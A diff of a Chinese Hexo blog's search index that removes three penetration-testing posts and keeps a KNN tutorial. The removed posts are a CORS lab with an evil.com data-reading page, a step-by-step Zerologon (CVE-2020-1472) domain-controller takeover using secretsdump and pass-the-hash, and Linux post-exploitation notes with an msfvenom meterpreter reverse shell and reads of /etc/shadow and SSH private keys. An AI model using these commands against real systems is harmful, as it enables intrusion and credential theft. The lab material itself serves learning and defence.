@@ -1,143 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>CORS</title>
-    <url>/2021/02/24/CORS/</url>
-    <content><![CDATA[<h3 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h3><hr>
-<h3 id="0x00-浏览器的同源策略"><a href="#0x00-浏览器的同源策略" class="headerlink" title="0x00 浏览器的同源策略"></a>0x00 浏览器的同源策略</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>同源策略 (Same Origin Policy)</strong>,同源策略是浏览器的一个安全功能，不同源的客户端脚本在没有明确授权的情况下，不能读取对方的资源。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;但随着Web应用的发展，网站由于自身业务的其需求，需要实现一些跨域功能，能让不用域的页面之间能互相访问各自页面的内容。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;浏览器的同源目的是为了保证用户信息的安全，防止恶意的网站窃取数据。如果王爷之间不满足同源要求，将不能：</p>
-<blockquote>
-<ol>
-<li>共享Cookie,LocalStorage,IndexDB  </li>
-<li>获取DOM  </li>
-<li>AJAX请求不能发送</li>
-</ol>
-</blockquote>
-<span id="more"></span>
-
-<h3 id="0x01-CORS介绍"><a href="#0x01-CORS介绍" class="headerlink" title="0x01 CORS介绍"></a>0x01 CORS介绍</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;__CORS，跨域资源共享（Cross-origin resource sharing）__，是H5提供的一种机制，WEB应用程序可以通过在HTTP增加字段来告诉浏览器，哪些不同来源的服务器是有权访问本站资源的，当不同域的请求发生时，就出现了跨域的现象。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CORS本质上就是使用各种头信息让浏览器与服务器之间进行交流，上面提到的名单就是用下面的http头字段来控制的： </p>
-<p><img src="/2021/02/24/CORS/1.jpg"></p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其中比较重要的相应头为：</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">Access-Control-Allow-Origin: http:<span class="regexp">//</span>a.com  	<span class="regexp">//</span>服务端接受来自http:<span class="regexp">//</span>a.com的跨域请求    </span><br><span class="line">Access-Control-Allow-Credentials: true  	<span class="regexp">//</span>表示是否允许发送Cookie，true即发送cookie</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="0×02-CORS漏洞的攻击流程"><a href="#0×02-CORS漏洞的攻击流程" class="headerlink" title="0×02 CORS漏洞的攻击流程"></a>0×02 CORS漏洞的攻击流程</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;假设用户登陆一个含有CORS配置网站<code>vuln.com</code>，同时又访问了攻击者提供的一个链接<code>evil.com</code>。<code>evil.com</code>的网站向<code>vuln.com</code>这个网站发起请求获取敏感数据，浏览器能否接收信息取决于<code>vuln.com</code>的配置。如果<code>vuln.com</code>配置了<code>Access-Control-Allow-Origin</code>头且为预期，那么允许接收，否则浏览器会因为同源策略而不接收。</p>
-<h3 id="0×03-CORS漏洞演示"><a href="#0×03-CORS漏洞演示" class="headerlink" title="0×03 CORS漏洞演示"></a>0×03 CORS漏洞演示</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先修改host文件，加上</p>
-<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0.0.1</span> www.vuln.com </span><br><span class="line"><span class="number">127.0.0.1</span> www.evil.com</span><br></pre></td></tr></table></figure>
-
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这样访问<a href="http://www.vuln.com就相当于服务端.服务端新建a.php./">http://www.vuln.com就相当于服务端。服务端新建a.php。</a></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;username: admin; password:123456&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果访问<code>http://www.vuln.com/a.php</code>，会正常输出<code>username: admin; password:123456</code></p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着在hacker端构造steal.html：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- www.evil.com/steal.html  --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello I evil page. <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">loadXMLDoc</span>(<span class="params"></span>)</span></span></span><br><span class="line">&#123;</span><br><span class="line"><span class="javascript"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">xhr.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span></span><br><span class="line">&#123;</span><br><span class="line"><span class="javascript">    <span class="keyword">if</span>(xhr.readyState == <span class="number">4</span> &amp;&amp; xhr.status == <span class="number">200</span>) <span class="comment">//if receive xhr response</span></span></span><br><span class="line">    &#123;</span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> datas=xhr.responseText;</span></span><br><span class="line">        alert(datas);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="javascript"><span class="comment">//request vuln page</span></span></span><br><span class="line"><span class="javascript">xhr.open(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;http://www.vuln.com/a.php&quot;</span>,<span class="string">&quot;true&quot;</span>) </span></span><br><span class="line">xhr.send();</span><br><span class="line">&#125;</span><br><span class="line">loadXMLDoc();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后打开<code>http://www.evil.com/steal.html</code>，html代码的意思是通过XMLHttpRequest访问&nbsp;&nbsp;<u>vuln.com/a.php</u>，然后将获取到的内容alert出来。</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;但是根据同源策略，这是不允许的，结果也和我想的一样：</p>
-<p><img src="/2021/02/24/CORS/2.jpg"></p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接下来改一下a.php：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Access-Control-Allow-Origin:http://www.evil.com&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;username: admin; password:123456&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>再次访问<code>http://www.evil.com/steal.html</code>，发现可以正常alert了，成功实现了跨域资源的请求。</p>
-<p><img src="/2021/02/24/CORS/3.jpg"></p>
-<h3 id="0×04-CORS漏洞防范"><a href="#0×04-CORS漏洞防范" class="headerlink" title="0×04 CORS漏洞防范"></a>0×04 CORS漏洞防范</h3><ul>
-<li>不要盲目反射Origin头</li>
-<li>严格校验Origin头，避免出现权限泄露</li>
-<li>不要配置Access-Control-Allow-Origin: null</li>
-<li>HTTPS网站不要信任HTTP域</li>
-<li>不要信任全部自身子域，减少攻击面</li>
-<li>不要配置Origin:*和Credentials: true</li>
-<li>增加Vary: Origin头</li>
-</ul>
-]]></content>
-      <categories>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CVE-2020-1472 Netlogon域权限提升漏洞</title>
-    <url>/2021/07/21/CVE-2020-1472-Netlogon%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="CVE-2020-1472-Netlogon域权限提升漏洞"><a href="#CVE-2020-1472-Netlogon域权限提升漏洞" class="headerlink" title="CVE-2020-1472 Netlogon域权限提升漏洞"></a>CVE-2020-1472 Netlogon域权限提升漏洞</h1><h3 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h3><h3 id="0x00-漏洞信息"><a href="#0x00-漏洞信息" class="headerlink" title="0x00 漏洞信息"></a>0x00 漏洞信息</h3><p><strong>漏洞编号：</strong>CVE-2020-1472</p>
-<p><strong>漏洞名称：</strong>Netlogon域权限提升</p>
-<p><strong>漏洞描述：</strong>2020年08月12日， 微软官方发布了 NetLogon 特权提升漏洞 的风险通告。攻击者通过NetLogon（MS-NRPC）， 建立与域控间易受攻击的安全通道时，可利用此漏洞获取域管访问权限。成功利用此漏洞的攻击者可以在该网络中 的设备上运行经特殊设计的应用程序。</p>
-<p><strong>影响版本：</strong></p>
-<p>Windows Server 2008 R2 for x64-based Systems Service Pack 1 </p>
-<p>Windows Server 2012 </p>
-<p>Windows Server 2016 </p>
-<p>Windows Server 2019 </p>
-<p>Windows Server, version 1903 (Server Core installation) </p>
-<p>Windows Server, version 1909 (Server Core installation) </p>
-<p>Windows Server, version 2004 (Server Core installation)</p>
-<span id="more"></span>
-
-<h3 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h3><p>环境：DC</p>
-<p>IP    ： 192.168.31.78 /10.10.10.10</p>
-<ol>
-<li><h6 id="查看域控主机名称"><a href="#查看域控主机名称" class="headerlink" title="查看域控主机名称"></a>查看域控主机名称</h6></li>
-</ol>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net <span class="built_in">group</span> <span class="string">&quot;domain controllers&quot;</span> /domain</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/07/21/CVE-2020-1472-Netlogon%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/1.png"></p>
-<ol start="2">
-<li><h6 id="检测漏洞是否存在"><a href="#检测漏洞是否存在" class="headerlink" title="检测漏洞是否存在"></a>检测漏洞是否存在</h6></li>
-</ol>
-<blockquote>
-<p><a href="https://github.com/SecuraBV/CVE-2020-1472">https://github.com/SecuraBV/CVE-2020-1472</a></p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python3 zerologon_tester.py DC <span class="number">192.168</span>.<span class="number">31.78</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/07/21/CVE-2020-1472-Netlogon%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/2.png"></p>
-<ol start="3">
-<li><h6 id="漏洞利用，重置域账号的哈希"><a href="#漏洞利用，重置域账号的哈希" class="headerlink" title="漏洞利用，重置域账号的哈希"></a>漏洞利用，重置域账号的哈希</h6></li>
-</ol>
-<blockquote>
-<p><a href="https://github.com/blackarrowsec/redteam-research">https://github.com/blackarrowsec/redteam-research</a></p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python CVE<span class="literal">-2020</span><span class="literal">-1472</span>.py DC DC<span class="variable">$</span> <span class="number">192.168</span>.<span class="number">31.78</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/07/21/CVE-2020-1472-Netlogon%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/3.png"></p>
-<ol start="4">
-<li><h6 id="获取域控用户hash"><a href="#获取域控用户hash" class="headerlink" title="获取域控用户hash"></a>获取域控用户hash</h6></li>
-</ol>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python3 secretsdump.py <span class="string">&#x27;de1ay.com/DC$@192.168.123.136&#x27;</span> <span class="literal">-no</span><span class="literal">-pass</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/07/21/CVE-2020-1472-Netlogon%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/4.png"></p>
-<ol start="5">
-<li><h6 id="wmiexec进行hash横向连接"><a href="#wmiexec进行hash横向连接" class="headerlink" title="wmiexec进行hash横向连接"></a>wmiexec进行hash横向连接</h6></li>
-</ol>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python wmiexec.py <span class="literal">-hashes</span> aad3b435b51404eeaad3b435b51404ee:<span class="number">3</span>b24c391862f4a8531a245a0217708c4 DC<span class="variable">$</span>/Administrator@<span class="number">192.168</span>.<span class="number">31.78</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/07/21/CVE-2020-1472-Netlogon%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/5.png"></p>
-<ol start="6">
-<li><h6 id="恢复域-获取hash"><a href="#恢复域-获取hash" class="headerlink" title="恢复域 - 获取hash"></a>恢复域 - 获取hash</h6></li>
-</ol>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#获取sam数据库</span></span><br><span class="line">reg save HKLM\SYSTEM system.save</span><br><span class="line">reg save HKLM\SAM sam.save</span><br><span class="line">reg save HKLM\SECURITY security.save</span><br><span class="line">get system.save</span><br><span class="line">get sam.save</span><br><span class="line">get security.save</span><br><span class="line"><span class="built_in">del</span> /f system.save</span><br><span class="line"><span class="built_in">del</span> /f sam.save</span><br><span class="line"><span class="built_in">del</span> /f security.sav</span><br></pre></td></tr></table></figure>
-
-<ol start="7">
-<li><h6 id="恢复域-获取hash-1"><a href="#恢复域-获取hash-1" class="headerlink" title="恢复域 - 获取hash"></a>恢复域 - 获取hash</h6></li>
-</ol>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#获取hash</span></span><br><span class="line">python secretsdump.py <span class="literal">-sam</span> sam.save <span class="literal">-system</span> system.save <span class="literal">-security</span> security.save LOCAL</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/07/21/CVE-2020-1472-Netlogon%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/6.png"></p>
-<ol start="8">
-<li><h6 id="恢复域"><a href="#恢复域" class="headerlink" title="恢复域"></a>恢复域</h6></li>
-</ol>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python reinstall_original_pw.py DC <span class="number">192.168</span>.<span class="number">31.78</span> f2b1b4d01ab6f44f28634a765bc53836</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/07/21/CVE-2020-1472-Netlogon%E5%9F%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/7.png"></p>
-]]></content>
-      <categories>
-        <category>渗透测试</category>
-      </categories>
-      <tags>
-        <tag>渗透测试</tag>
-        <tag>漏洞复现</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>K近邻算法（KNN）</title>
     <url>/2021/12/31/K%E8%BF%91%E9%82%BB%E7%AE%97%E6%B3%95%EF%BC%88KNN%EF%BC%89/</url>
     <content><![CDATA[<h1 id="K近邻算法"><a href="#K近邻算法" class="headerlink" title="K近邻算法"></a>K近邻算法</h1><h4 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h4><h3 id="0x00-工作原理"><a href="#0x00-工作原理" class="headerlink" title="0x00 工作原理"></a>0x00 工作原理</h3><p>给定一个样本集，并且其中每一个样本都设定特征值，并事先给定标签。输入新数据时，将新数据的特征值与样本数据中的进行对比，计算未标记样本和数据集中每个样本的距离，取其距离最近的K个样本。此时，新数据的分类便从这K个距离最近的样本投票产生。</p>
@@ -307,79 +170,6 @@ M1001 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">�
       <tags>
         <tag>KNN</tag>
         <tag>算法</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Linux主机信息收集</title>
-    <url>/2021/03/13/Linux%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
-    <content><![CDATA[<h3 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h3><h3 id="0x00-Linux主机渗透"><a href="#0x00-Linux主机渗透" class="headerlink" title="0x00 Linux主机渗透"></a>0x00 Linux主机渗透</h3><h5 id="MSF生成LUNIX平台可执行文件"><a href="#MSF生成LUNIX平台可执行文件" class="headerlink" title="MSF生成LUNIX平台可执行文件"></a>MSF生成LUNIX平台可执行文件</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> linux/x86/meterpreter/reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">31.246</span> lport=<span class="number">8882</span> <span class="operator">-f</span> elf <span class="literal">-o</span> localmsf8882.elf</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/03/13/Linux%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/1.png"></p>
-<p>生成linux后门时需注意位数为32还是64，和架构: 常见架构：</p>
-<blockquote>
-<p>32bit ：i386,i686,x86,arm </p>
-<p>64bit ：x64,x86_64,amd64,arm64,aarch64</p>
-</blockquote>
-<span id="more"></span>
-
-<h5 id="MSF开启handler"><a href="#MSF开启handler" class="headerlink" title="MSF开启handler"></a>MSF开启handler</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">handler <span class="literal">-H</span> <span class="number">192.168</span>.<span class="number">31.246</span> <span class="literal">-P</span> <span class="number">8882</span> <span class="literal">-p</span> linux/x86/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/03/13/Linux%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/2.png"></p>
-<h5 id="上传后门至靶机-tmp目录：所有用户、用户组都具有可写权限"><a href="#上传后门至靶机-tmp目录：所有用户、用户组都具有可写权限" class="headerlink" title="上传后门至靶机 /tmp目录：所有用户、用户组都具有可写权限"></a>上传后门至靶机 /tmp目录：所有用户、用户组都具有可写权限</h5><h5 id="靶机运行后门，获取meterpreter"><a href="#靶机运行后门，获取meterpreter" class="headerlink" title="靶机运行后门，获取meterpreter"></a>靶机运行后门，获取meterpreter</h5><p><img src="/2021/03/13/Linux%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/3.png"></p>
-<h5 id="meterpreter获取到shell默认是-bin-sh"><a href="#meterpreter获取到shell默认是-bin-sh" class="headerlink" title="meterpreter获取到shell默认是/bin/sh"></a>meterpreter获取到shell默认是/bin/sh</h5><h5 id="可以使用-python-c-“import-pty-pty-spawn-‘-bin-bash’-”切换至-bin-bash"><a href="#可以使用-python-c-“import-pty-pty-spawn-‘-bin-bash’-”切换至-bin-bash" class="headerlink" title="可以使用 python -c “import pty;pty.spawn(‘/bin/bash’);”切换至/bin/bash"></a>可以使用 python -c “import pty;pty.spawn(‘/bin/bash’);”切换至/bin/bash</h5><p><img src="/2021/03/13/Linux%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/4.png"></p>
-<p><img src="/2021/03/13/Linux%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/5.png"></p>
-<h3 id="0x01-Linux主机信息收集"><a href="#0x01-Linux主机信息收集" class="headerlink" title="0x01 Linux主机信息收集"></a>0x01 Linux主机信息收集</h3><h4 id="1-系统架构"><a href="#1-系统架构" class="headerlink" title="1 - 系统架构"></a>1 - 系统架构</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">uname <span class="literal">-a</span>		// 打印系统信息</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/issue		///etc/issue是一个文本文件，其中包含在登录提示之前打印的消息或系统标识</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/*<span class="literal">-release</span>	// /etc/lsb<span class="literal">-release</span>, /etc/redhat<span class="literal">-release</span> 查看操作系统发行版本。</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /proc/version	// /proc/version指定了Linux内核的版本，用于编译内核的gcc的版本以及内核</span><br><span class="line">			   编译的时间.它还包含内核编译器的用户名。</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /proc/sys/kernel/version	// /proc/sys/kernel/ 中的文件可以用来调整和监视Linux内核</span><br><span class="line">			 	   操作中的各种活动</span><br></pre></td></tr></table></figure>
-
-<h4 id="2-进程"><a href="#2-进程" class="headerlink" title="2 - 进程"></a>2 - 进程</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ps</span> <span class="literal">-elf</span>				// 列出当前进程快照</span><br><span class="line"></span><br><span class="line"><span class="built_in">ps</span> aux				// 列出当前进程快照</span><br><span class="line"></span><br><span class="line">s <span class="literal">-al</span> /proc/			// /proc是非常特殊的，它也是一个虚拟文件系统。 它有时被称为过程</span><br><span class="line">				信息伪文件系统。它不包含“真实”文件，而是包含运行时系统信息（例</span><br><span class="line">				如系统内存，安装的设备，硬件配置等）</span><br><span class="line">							</span><br><span class="line"><span class="built_in">ls</span> <span class="literal">-al</span> /proc/<span class="number">99</span>			// 查看关于PID <span class="number">99</span>的信息		</span><br><span class="line"></span><br><span class="line">top				//top命令显示您的Linux机器的处理器活动，并显示实时管理的任务。</span><br><span class="line">				它会显示正在使用的处理器和内存以及运行进程等其他信息。按q可以退出	  </span><br></pre></td></tr></table></figure>
-
-<h4 id="3-用户和组"><a href="#3-用户和组" class="headerlink" title="3 - 用户和组"></a>3 - 用户和组</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">id					// 找到用户的UID或GID等信息.</span><br><span class="line"></span><br><span class="line">w					// 显示登录到Linux服务器的人员.</span><br><span class="line"></span><br><span class="line">whoami					// 显示当前用户名</span><br><span class="line"></span><br><span class="line">last lastb				// 显示用户登录记录 显示用户登录失败记录</span><br><span class="line"></span><br><span class="line">lastlog					// 格式化打印上次登录日志 /var/log/lastlog 文件的内容</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/passwd				// 有关用户信息的基于文本的数据库，可以登录系统或其他拥</span><br><span class="line">					   有正在运行的进程的操作系统用户身份。</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/shadow				// /etc/shadow用于通过限制除高度特权的用户对散列密码</span><br><span class="line">				 	   数据的访问来提高密码的安全级别。</span><br><span class="line">				 	   通常情况下，该数据保存在超级用户拥有的文件中，并且只</span><br><span class="line">				 	   能由超级用户访问。</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/sudoers			// /etc/sudoers 文件内容是使用sudo命令必须遵守的规则</span><br><span class="line"></span><br><span class="line">sudo <span class="literal">-V</span>					// 打印sudo版本字符串</span><br><span class="line"></span><br><span class="line">sudo <span class="literal">-l</span>					// 列出目前用户可执行与无法执行的指令</span><br></pre></td></tr></table></figure>
-
-<h4 id="4-SSH服务信息"><a href="#4-SSH服务信息" class="headerlink" title="4 - SSH服务信息"></a>4 - SSH服务信息</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> ~/.ssh/authorized_keys		// 使用公钥认证，认证实体具有公钥和私钥。私钥保存在登录</span><br><span class="line">					   的计算机上,公钥存在要登录的所有计算机上 .ssh/authorized_keys 文件中。</span><br><span class="line"><span class="built_in">cat</span> ~/.ssh/id_rsa.pub			// RSA 公钥 会保存为 .ssh/id_rsa.pub.</span><br><span class="line"><span class="built_in">cat</span> ~/.ssh/id_rsa			// RSA 私钥 会保存在你的home目录中 ：.ssh/id_rsa</span><br><span class="line"><span class="built_in">cat</span> /etc/ssh/ssh_config			// OpenSSH SSH 控制端配置文件</span><br><span class="line"><span class="built_in">cat</span> /etc/ssh/sshd_config		// OpenSSH SSH 服务端配置文件</span><br><span class="line"></span><br><span class="line">密钥登录</span><br><span class="line"></span><br><span class="line">ssh<span class="literal">-keygen</span>					// 生成密钥对，私钥保存在你登录的计算机上公</span><br><span class="line">						  钥存储在要登录的所有计算机上的.ssh/authorized_keys 文件中。</span><br><span class="line"><span class="built_in">cat</span> ~/.ssh/id_rsa.pub &gt;&gt; authorized_keys	// 安装公钥</span><br><span class="line">chmod <span class="number">600</span> ~/.ssh/authorized_keys</span><br><span class="line">chmod <span class="number">600</span> ~/.ssh/id_rsa</span><br><span class="line">chmod <span class="number">700</span> ~/.ssh				// 设置权限		</span><br><span class="line">vim /etc/ssh/sshd_config			// 编辑服务端配置文件</span><br><span class="line"></span><br><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line">PermitRootLogin yes				// [可选]禁用密码登录</span><br><span class="line">PasswordAuthentication no</span><br><span class="line"></span><br><span class="line">service sshd restart				// 重启ssh服务</span><br></pre></td></tr></table></figure>
-
-<h4 id="5-服务状态"><a href="#5-服务状态" class="headerlink" title="5 - 服务状态"></a>5 - 服务状态</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">service -<span class="literal">-status</span><span class="literal">-all</span>				// 检查所有服务状态</span><br><span class="line">systemctl <span class="literal">-a</span>					// 列出安装在文件系统中的所有单元.</span><br><span class="line">service servicename <span class="built_in">start</span></span><br><span class="line">systemctl <span class="built_in">start</span> servicename			// 启动某个服务</span><br><span class="line">service servicename stop</span><br><span class="line">systemctl stop servicename			// 停止某个服务</span><br><span class="line">service servicename status</span><br><span class="line">systemctl status servicename			// 显示某个服务状态信息</span><br><span class="line"><span class="built_in">cat</span> /etc/services				// /etc/services将端口号映射到指定的服务</span><br></pre></td></tr></table></figure>
-
-<h4 id="6-安全-iptables"><a href="#6-安全-iptables" class="headerlink" title="6 - 安全 - iptables"></a>6 - 安全 - iptables</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">iptables <span class="literal">-L</span>				// 列出所有规则链。</span><br><span class="line">iptables <span class="operator">-F</span>				// 删除选定规则链中的所有规则.</span><br><span class="line">iptables <span class="literal">-A</span> INPUT <span class="literal">-p</span> icmp <span class="literal">-m</span> icmp –icmp<span class="literal">-type</span> <span class="number">0</span> <span class="literal">-j</span> ACCEPT</span><br><span class="line">					// 请执行iptables <span class="literal">-p</span> icmp –help 获得更多信息.</span><br><span class="line">					</span><br><span class="line">iptables <span class="literal">-A</span> INPUT <span class="literal">-p</span> tcp <span class="literal">-m</span> tcp –sport <span class="number">80</span> <span class="literal">-m</span> state –state RELATED,ESTABLISHED <span class="literal">-j</span> ACCEPT</span><br><span class="line">            	// 允许来自src端口<span class="number">80</span>的tcp连接</span><br><span class="line">            	// <span class="literal">-A</span> 新增一条规则 , INPUT[入方向],OUTPUT[出方向]</span><br><span class="line">            	// <span class="literal">-p</span> 协议类型</span><br><span class="line">            	// <span class="literal">-sport</span> 源端口 <span class="literal">-dport</span> 目标端口</span><br><span class="line">            	// <span class="literal">-j</span> 处理数据包的动作，ACCEPT 、DROP</span><br><span class="line"></span><br><span class="line">iptables <span class="literal">-A</span> OUTPUT <span class="literal">-p</span> tcp <span class="literal">-m</span> tcp <span class="literal">-dport</span> <span class="number">80</span> <span class="literal">-m</span> state –state NEW,RELATED,ESTABLISHED <span class="literal">-j</span> ACCEPT</span><br><span class="line">				// 允许 从/到 dst 端口<span class="number">80</span>的TCP连接.</span><br><span class="line">			</span><br><span class="line">iptables <span class="literal">-A</span> INPUT <span class="literal">-p</span> udp <span class="literal">-m</span> udp –sport <span class="number">53</span> <span class="literal">-m</span> state –state RELATED,ESTABLISHED <span class="literal">-j</span> ACCEPT</span><br><span class="line">				// 允许来自src端口<span class="number">80</span>的udp连接</span><br><span class="line"></span><br><span class="line">iptables <span class="literal">-A</span> OUTPUT <span class="literal">-p</span> udp <span class="literal">-m</span> udp –dport <span class="number">53</span> <span class="literal">-m</span> state –state NEW,RELATED,ESTABLISHED <span class="literal">-j</span> ACCEPT</span><br><span class="line">				// 允许从/到 dst 端口<span class="number">53</span>的udp连接.</span><br><span class="line">                </span><br><span class="line">iptables <span class="literal">-A</span> OUTPUT <span class="literal">-p</span> tcp <span class="literal">-m</span> tcp –sport <span class="number">55552</span> <span class="literal">-s</span> <span class="number">127.0</span>.<span class="number">0.1</span> <span class="literal">-d</span> <span class="number">127.0</span>.<span class="number">0.1</span> <span class="literal">-j</span> ACCEPT</span><br><span class="line">iptables <span class="literal">-A</span> OUTPUT <span class="literal">-p</span> tcp <span class="literal">-m</span> tcp –dport <span class="number">55552</span> <span class="literal">-s</span> <span class="number">127.0</span>.<span class="number">0.1</span> <span class="literal">-d</span> <span class="number">127.0</span>.<span class="number">0.1</span> <span class="literal">-j</span> ACCEPT</span><br><span class="line">				// 允许本地主机连接到 localhost:<span class="number">55552</span></span><br><span class="line">				// <span class="literal">-s</span> 原地址ip <span class="literal">-d</span> 目标地址ip</span><br><span class="line">				// <span class="literal">-i</span> 指定数据包从哪块网卡进入<span class="literal">-o</span>指定数据包从哪块网卡输出</span><br></pre></td></tr></table></figure>
-
